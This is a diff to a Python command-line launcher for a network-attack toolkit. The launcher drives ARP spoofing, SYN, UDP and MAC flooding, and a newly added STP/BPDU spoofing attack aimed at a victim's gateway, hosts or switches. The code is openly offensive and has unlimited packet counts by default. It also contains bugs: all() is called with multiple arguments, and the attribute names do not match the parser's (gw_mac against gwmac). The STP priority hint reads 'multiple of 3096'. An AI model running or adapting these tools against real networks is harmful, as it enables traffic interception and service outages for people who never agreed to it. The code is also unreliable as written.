@@ -20,6 +20,7 @@
 import sys
 import argparse
 import logging
+from textwrap import dedent
 from warnings import filterwarnings
 
 filterwarnings("ignore")
@@ -30,11 +31,78 @@ from hackme import *  # pylint: disable=W0401,C0413  # noqa: F403,E402
 _LOGGER = logging.getLogger(__name__)
 
 
-def run_arp_spoofing(arp_spoofer, gw_mac, gw_ip, victim_mac, victim_ip):
+def run_arp_spoofing(subparser, args):
     """Run the ARP spoofing attack"""
-    arp_spoofer.add_gateway(gw_mac, gw_ip)
-    arp_spoofer.add_victim(victim_mac, victim_ip)
+    arp_spoofer = ARPSpoofer(args.iface, args.mac)  # noqa: F405
+    if args.desc:
+        print(arp_spoofer.description)
+        sys.exit(0)
+    if (
+        all(
+            args.iface,
+            args.mac,
+            args.gwmac,
+            args.gwip,
+            args.victmac,
+            args.victip,
+        )
+        is False
+    ):
+        subparser.print_help()
+        sys.exit(1)
+    arp_spoofer.add_gateway(args.gw_mac, args.gw_ip)
+    arp_spoofer.add_victim(args.victim_mac, args.victim_ip)
     arp_spoofer.run()
+
+
+def run_flooder(subparser, args):
+    """Run SYN, UDP or MAC flood attack"""
+    match args.attack:
+        case "synflood":
+            subargs = [args.destIP, args.port, args.count]
+            flooder = SYNFlooder(*subargs)  # noqa: F405
+        case "udpflood":
+            subargs = [args.destIP, args.port, args.count]
+            flooder = UDPFlooder(*subargs)  # noqa: F405
+        case "macflood":
+            subargs = [args.iface, args.victmac]
+            flooder = MACFlooder(*subargs)  # noqa: F405
+        case _:
+            raise ValueError(f"Wrong attack name {args.attack}")
+    if args.desc:
+        print(flooder.description)
+        sys.exit(0)
+    if all(subargs) is False:
+        subparser.print_help()
+        sys.exit(1)
+    flooder.run()
+
+
+def run_stpflood(subparser, args):
+    """Run BPDU spoof attack"""
+    bpdu_packet = BPDUPacket(  # noqa: F405
+        args.iface, args.srcmac, args.dstmac, args.priority
+    )
+    if args.desc:
+        print(
+            dedent(
+                """\
+        On a Layer 2 network, switches running STP, RSTP, MSTP, or VBST
+        exchange BPDUs to calculate a spanning tree and trim the network
+        into a loop-free tree topology. If forged BPDUs are sent to attack a
+        device with edge ports and received by them, the device will
+        automatically change the edge ports to non-edge ports and recalculate
+        the spanning tree. If the bridge priority in the BPDUs sent by an
+        attacker is higher than the priority of the root bridge, the network
+        topology will change, thereby interrupting service traffic.
+        """
+            )
+        )
+        sys.exit(0)
+    if all((args.iface, args.srcmac, args.dstmac)) is False:
+        subparser.print_help()
+        sys.exit(1)
+    bpdu_packet.send_multiple_bpdu_packets()
 
 
 def main():  # pylint: disable=R0915,R0912
@@ -43,12 +111,15 @@ def main():  # pylint: disable=R0915,R0912
     parser.add_argument(
         "--debug",
         help="Enable the debug mode",
-        default=False,
-        action="store_true",
+        action="store_const",
+        dest="log_level",
+        default=logging.INFO,
+        const=logging.DEBUG,
     )
     subparser = parser.add_subparsers(
         dest="attack",
         help="Enter the attack name",
+        required=True,
     )
 
     # The ARP spofing subparser
@@ -94,7 +165,6 @@ def main():  # pylint: disable=R0915,R0912
     parser_synflood.add_argument(
         "-c",
         "--count",
-        "-c",
         help="Number of packets. Default 9223372036854775807",
     )
     parser_synflood.add_argument(
@@ -114,7 +184,6 @@ def main():  # pylint: disable=R0915,R0912
     parser_udpflood.add_argument(
         "-c",
         "--count",
-        "-c",
         help="Number of packets. Default 9223372036854775807",
     )
     parser_udpflood.add_argument(
@@ -145,93 +214,56 @@ def main():  # pylint: disable=R0915,R0912
         "--desc", help="Print attack description", action="store_true"
     )
 
+    # The STP spoofing subparser
+    parser_stpspoof = subparser.add_parser(
+        "stpspoof", help="The STP spoofing attack"
+    )
+    parser_stpspoof.add_argument(
+        "-i", "--iface", help="Your network interface (i.e eth0)"
+    )
+    parser_stpspoof.add_argument(
+        "-smac", "--srcmac", help="Your interface MAC address"
+    )
+    parser_stpspoof.add_argument(
+        "-dmac", "--dstmac", help="Switch interface MAC address"
+    )
+    parser_stpspoof.add_argument(
+        "-p",
+        "--priority",
+        help="Your STP priority (less is better). Must be a multiple "
+        "of 3096. Default 8192",
+    )
+    parser_stpspoof.add_argument(
+        "--desc", help="Print attack description", action="store_true"
+    )
+
     args = parser.parse_args()
 
-    format_str = "%(levelname)s [ %(funcName)s() ] %(message)s"
+    logging.basicConfig(
+        format="%(levelname)s [ %(funcName)s() ] %(message)s",
+        level=args.log_level,
+    )
 
-    if args.debug:
-        logging.basicConfig(format=format_str, level=logging.DEBUG)
-    else:
-        logging.basicConfig(format=format_str, level=logging.INFO)
+    attack_func_mapping = {
+        "arpspoof": run_arp_spoofing,
+        "synflood": run_flooder,
+        "udpflood": run_flooder,
+        "macflood": run_flooder,
+        "stpspoof": run_stpflood,
+    }
+    subparsers_map = {
+        "arpspoof": parser_arpspoof,
+        "synflood": parser_synflood,
+        "udpflood": parser_udpflood,
+        "macflood": parser_macflood,
+        "stpspoof": parser_stpspoof,
+    }
 
-    if args.attack is None:
-        parser.print_help()
-
-    if args.attack == "arpspoof":
-        try:
-            arp_spoofer = ARPSpoofer(args.iface, args.mac)  # noqa: F405
-            if args.desc:
-                print(arp_spoofer.description)
-                sys.exit(0)
-            if (
-                all(
-                    (
-                        args.iface,
-                        args.mac,
-                        args.gwmac,
-                        args.gwip,
-                        args.victmac,
-                        args.victip,
-                    )
-                )
-                is False
-            ):
-                parser_arpspoof.print_help()
-                sys.exit(0)
-            run_arp_spoofing(
-                arp_spoofer, args.gwmac, args.gwip, args.victmac, args.victip
-            )
-        except Exception as exc:
-            _LOGGER.error(exc, exc_info=True)
-            sys.exit(1)
-
-    elif args.attack == "synflood":
-        try:
-            syn_flooder = SYNFlooder(  # noqa: F405
-                args.destIP, args.port, args.count
-            )
-            if args.desc:
-                print(syn_flooder.description)
-                sys.exit(0)
-            if all((args.destIP, args.port)) is False:
-                parser_synflood.print_help()
-                sys.exit(0)
-            syn_flooder.run()
-        except Exception as exc:
-            _LOGGER.error("\n%s", exc, exc_info=True)
-            sys.exit(1)
-
-    elif args.attack == "udpflood":
-        try:
-            udp_flooder = UDPFlooder(  # noqa: F405
-                args.destIP, args.port, args.count
-            )
-            if args.desc:
-                print(udp_flooder.description)
-                sys.exit(0)
-            if all((args.destIP, args.port)) is False:
-                parser_udpflood.print_help()
-                sys.exit(0)
-            udp_flooder.run()
-        except Exception as exc:
-            _LOGGER.error("\n%s", exc, exc_info=True)
-            sys.exit(1)
-
-    elif args.attack == "macflood":
-        try:
-            mac_flooder = MACFlooder(  # noqa: F405
-                args.iface, args.victmac, args.count
-            )
-            if args.desc:
-                print(mac_flooder.description)
-                sys.exit(0)
-            if all((args.iface, args.victmac)) is False:
-                parser_macflood.print_help()
-                sys.exit(0)
-            mac_flooder.run()
-        except Exception as exc:
-            _LOGGER.error("\n%s", exc, exc_info=True)
-            sys.exit(1)
+    try:
+        attack_func_mapping[args.attack](subparsers_map[args.attack], args)
+    except Exception as exc:
+        _LOGGER.error(str(exc))
+        raise exc
 
 
 if __name__ == "__main__":
